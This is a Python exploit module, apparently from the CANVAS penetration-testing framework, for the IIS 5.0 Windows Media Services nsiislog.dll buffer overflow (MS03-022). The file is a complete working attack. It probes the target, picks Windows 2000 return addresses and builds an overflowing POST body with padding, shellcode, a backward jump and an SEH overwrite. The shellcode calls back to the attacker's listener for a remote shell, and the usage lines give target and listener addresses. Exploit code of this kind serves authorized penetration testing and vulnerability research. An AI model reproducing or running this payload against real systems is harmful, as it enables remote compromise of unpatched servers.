#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='IIS 5.0 Windows Media Services ISAPI Overflow'
DESCRIPTION='IIS 5.0 Windows Media Services ISAPI (nsisslog.dll) Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='02/25/03'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms03-022.mspx'
DOCUMENTATION['Repeatability']='Repeatable'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2003-0349"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0349"
DOCUMENTATION['CVSS'] = 7.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS03-022'

GTK2_DIALOG="dialog.glade2"

NAME=DESCRIPTION

NOTES="""
Tested on:
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP1 English OOTB
Windows 2000 Server SP2 English OOTB
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/ms03_022/ms03_022.py -v 1 -t 10.10.11.22 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import canvasengine
runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

targets = {
    0:['Autodetect (N/A)',0,0],
    1:['Windows 2000 SP0-SP3',0x187533,0], #jmp ebx
    2:['Windows 2000 SP4',0x187533,0x1004], #jmp ebx
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=80
        self.ssl=0
        self.badstring='\x00'
        self.searchcode=''
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        return 
    
    def test(self):
        self.getargs()

        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
            return 0
        self.websend(s,'GET /scripts/nsiislog.dll HTTP/1.0\r\n\r\n')
        data=self.webrecv(s)
        if data.count('NetShow ISAPI Log Dll')>0:
            self.version=2 #SP4 is more likely
            return 1
        return 0      
    
    def run(self):
        self.getargs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Autoversioning not available')
                return 0
        self.info,self.eip,self.padding=targets[self.version]

        body=''
        body+='MX_STATS_LogLine='
        body+='A'*(0x1114-len(body))
        body+='BBB\xff' #access violation
        payload=''
        payload+=self.shellcode
        payload+='C'*(0xf758-0xe174+self.padding-len(payload))
        from MOSDEF import mosdef
        payload+=mosdef.assemble('jmp $-%d'%(len(payload)+5),'x86')
        payload+='DDD'
        payload+='\xeb\xf6'
        payload+='EE'
        payload+=struct.pack('<L',self.eip) #SEH
        body+=payload
        request=''
        request+='POST /scripts/nsiislog.dll HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='Content-Length: %d\r\n'%(len(body))
        request+='\r\n'
        request+=body

        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)
        time.sleep(3)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
